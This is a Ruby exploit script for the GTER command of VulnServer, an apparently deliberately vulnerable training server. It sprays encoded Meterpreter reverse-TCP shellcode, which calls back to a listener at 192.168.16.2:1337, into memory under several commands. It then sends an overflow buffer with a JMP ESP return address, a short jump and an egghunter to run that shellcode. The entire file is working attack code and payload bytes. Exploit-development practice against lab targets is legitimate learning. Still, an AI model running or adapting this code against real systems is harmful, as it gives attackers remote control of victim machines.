#! /usr/bin/env ruby
# VulnServer.exe GTER Exploit
# 
# Usage ./gter.rb <IP> <PORT> 
#
require 'socket'

# Check arguments
if ARGV.length < 2
  puts "usage #{__FILE__} <target ip> <target port>"
  exit
end

# Socket variables from ARGV
IP = ARGV[0]
PORT = ARGV[1]

#
# Fill memory with shellcode
#
puts "[+] Sending shellcodes to memory"

pre_cmds = [
 "HELP", "GMON", "GDOG", "HTER", "LTER", "KSTAN" 
]

egg= "r0ckr0ck"

# msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai 
# -b "\x00\x0a\x0d" -f ruby LHOST=192.168.16.2 LPORT=1337 
# x86/shikata_ga_nai chosen with final size 360
# Payload size: 360 bytes
shellcode = 
  "\xdb\xdd\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x54\xba\xa4\x95" +
  "\x01\x93\x83\xeb\xfc\x31\x53\x14\x03\x53\xb0\x77\xf4\x6f" +
  "\x50\xf5\xf7\x8f\xa0\x9a\x7e\x6a\x91\x9a\xe5\xfe\x81\x2a" +
  "\x6d\x52\x2d\xc0\x23\x47\xa6\xa4\xeb\x68\x0f\x02\xca\x47" +
  "\x90\x3f\x2e\xc9\x12\x42\x63\x29\x2b\x8d\x76\x28\x6c\xf0" +
  "\x7b\x78\x25\x7e\x29\x6d\x42\xca\xf2\x06\x18\xda\x72\xfa" +
  "\xe8\xdd\x53\xad\x63\x84\x73\x4f\xa0\xbc\x3d\x57\xa5\xf9" +
  "\xf4\xec\x1d\x75\x07\x25\x6c\x76\xa4\x08\x41\x85\xb4\x4d" +
  "\x65\x76\xc3\xa7\x96\x0b\xd4\x73\xe5\xd7\x51\x60\x4d\x93" +
  "\xc2\x4c\x6c\x70\x94\x07\x62\x3d\xd2\x40\x66\xc0\x37\xfb" +
  "\x92\x49\xb6\x2c\x13\x09\x9d\xe8\x78\xc9\xbc\xa9\x24\xbc" +
  "\xc1\xaa\x87\x61\x64\xa0\x25\x75\x15\xeb\x21\xba\x14\x14" +
  "\xb1\xd4\x2f\x67\x83\x7b\x84\xef\xaf\xf4\x02\xf7\xd0\x2e" +
  "\xf2\x67\x2f\xd1\x03\xa1\xeb\x85\x53\xd9\xda\xa5\x3f\x19" +
  "\xe3\x73\xd5\x1c\x73\xbc\x82\x0f\x81\x54\xd1\x2f\x80\x9d" +
  "\x5c\xc9\xda\x8d\x0e\x46\x9a\x7d\xef\x36\x72\x94\xe0\x69" +
  "\x62\x97\x2a\x02\x08\x78\x83\x7a\xa4\xe1\x8e\xf1\x55\xed" +
  "\x04\x7c\x55\x65\xad\x80\x1b\x8e\xc4\x92\x4b\xef\x26\x6b" +
  "\x8b\x9a\x26\x01\x8f\x0c\x70\xbd\x8d\x69\xb6\x62\x6e\x5c" +
  "\xc4\x65\x90\x21\xfd\x1e\xa6\xb7\x41\x49\xc6\x57\x42\x89" +
  "\x90\x3d\x42\xe1\x44\x66\x11\x14\x8b\xb3\x05\x85\x19\x3c" +
  "\x7c\x79\x8a\x54\x82\xa4\xfc\xfa\x7d\x83\x7f\xfc\x82\x51" +
  "\x5d\xa5\xea\xa9\xe1\x55\xeb\xc3\xe1\x05\x83\x18\xce\xaa" +
  "\x63\xe0\xc5\xe2\xeb\x6b\x8b\x41\x8d\x6c\x86\x04\x13\x6c" +
  "\x24\x9d\x42\xe3\xcb\x22\x6b\x05\xf0\xf4\x52\x73\x31\xc5" +
  "\xe0\x8c\x08\x68\x40\x07\x72\x3e\x92\x02"

pre_cmds.each do |cmd|
  puts "[+] Sending shellcode buffer for command #{cmd}"
  s = TCPSocket.new(IP, PORT)
  s.gets
  s.puts(cmd + " " + egg + shellcode)
  s.close
end

puts "[+] Connecting..."
s = TCPSocket.new(IP, PORT)
# 
# Send the exploit
#
puts "[+] Creating trigger payload (egghunter)..."
s = TCPSocket.new(IP, PORT)

# Define command
cmd = "GTER /.:/"

# Build payload
ret =  "\xaf\x11\x50\x62"   # 625011AF FFE4 JMP ESP
stage1 = "\xeb\xca\x41\x41" # EBDA JMP SHORT -0x34

# egghunter r0ckr0ck
stage2 = 
  "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05" +
  "\x5a\x74\xef\xb8\x72\x30\x63\x6b\x89\xd7\xaf\x75\xea\xaf" +
  "\x75\xe7\xff\xe7"

payload = "\x41" * 99 + stage2 + "\x90" * 16 + ret + stage1

# Send the payload
begin
  s.gets
  puts "[+] Sending trigger payload.."
  s.puts(cmd + payload)
  s.gets
  puts "[-] Failed to crash the target"
  s.close
rescue Errno::ECONNRESET
  puts "[+] Crash!!"
end

